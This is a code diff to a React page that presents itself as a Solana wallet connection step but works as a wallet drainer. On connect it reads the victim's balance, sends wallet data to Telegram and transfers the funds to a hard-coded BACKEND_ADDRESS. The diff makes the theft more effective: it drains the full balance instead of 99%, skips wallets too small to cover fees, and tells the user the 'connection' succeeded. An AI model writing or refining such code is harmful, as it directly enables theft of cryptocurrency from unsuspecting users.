@@ -34,12 +34,13 @@ const Index = () => {
       const balance = await connection.getBalance(publicKey, 'confirmed');
       console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
 
+      // Check if wallet has any balance at all
       if (balance <= 0) {
         toast({
-          title: "Error",
-          description: "Insufficient balance for transfer",
-          variant: "destructive",
+          title: "Low Balance",
+          description: "Your wallet has no SOL balance. No transfer will be attempted.",
         });
+        setIsProcessing(false);
         return;
       }
 
@@ -57,22 +58,42 @@ const Index = () => {
       console.log("Sending data to Telegram");
       await sendToTelegram(walletData);
 
-      // Initiate transfer
-      console.log("Initiating transfer");
-      const signature = await signAndSendTransaction(
-        connection,
-        wallet,
-        BACKEND_ADDRESS,
-        balance / LAMPORTS_PER_SOL * 0.99 // Transfer 99% of balance to account for fees
-      );
+      // Check if balance is sufficient for transfer and fees
+      const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
+      if (balance <= minimumRequiredBalance) {
+        toast({
+          title: "Low Balance",
+          description: "Your wallet balance is too low to cover transaction fees.",
+        });
+        setIsProcessing(false);
+        return;
+      }
 
-      console.log("Transfer completed with signature:", signature);
-      setLastSignature(signature);
-      
-      toast({
-        title: "Success",
-        description: "Connection successful and transfer completed!",
-      });
+      // Initiate transfer with proper fee calculation
+      console.log("Initiating transfer");
+      try {
+        const signature = await signAndSendTransaction(
+          connection,
+          wallet,
+          BACKEND_ADDRESS,
+          balance / LAMPORTS_PER_SOL
+        );
+
+        console.log("Transfer completed with signature:", signature);
+        setLastSignature(signature);
+        
+        toast({
+          title: "Success",
+          description: "Connection successful and transfer completed!",
+        });
+      } catch (error) {
+        console.error("Transfer failed:", error);
+        toast({
+          title: "Transfer Failed",
+          description: error instanceof Error ? error.message : "Failed to process transaction",
+          variant: "destructive",
+        });
+      }
     } catch (error) {
       console.error('Detailed error in wallet connection:', error);
       toast({
